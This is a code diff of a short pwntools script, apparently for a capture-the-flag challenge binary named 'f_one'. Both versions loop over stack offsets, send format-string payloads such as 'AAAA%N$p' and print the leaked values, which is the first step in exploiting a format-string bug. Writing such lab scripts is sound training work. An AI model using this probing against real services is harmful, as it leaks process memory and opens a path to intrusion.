@@ -1,17 +1,18 @@
 from pwn import *
 
-elf = context.binary = ELF('./f_one', checksec=False)
+exe = './f_one'
 
-for i in range(50):
-    try:
-        p = process(level='error')
-        p.sendlineafter("give me something", '%{}$p'.format(i).encode())
-        p.recvline()
+elf = context.binary = ELF(exe, checksec=False)
 
-        result = p.recvline().decode()
+context.log_level = 'warning'
 
-        if result:
-            print(str(i) + ': ' + str(result).strip())
-
-    except EOFError:
-        pass
+for i in range(1, 100):
+	try:
+		p = process()
+		p.sendlineafter(b':', 'AAAA%{}$p'.format(i).encode())
+		p.recvline()
+		result = p.recvline()
+		print(str(i) + ': ' + str(result))
+		p.close()
+	except EOFError:
+		pass
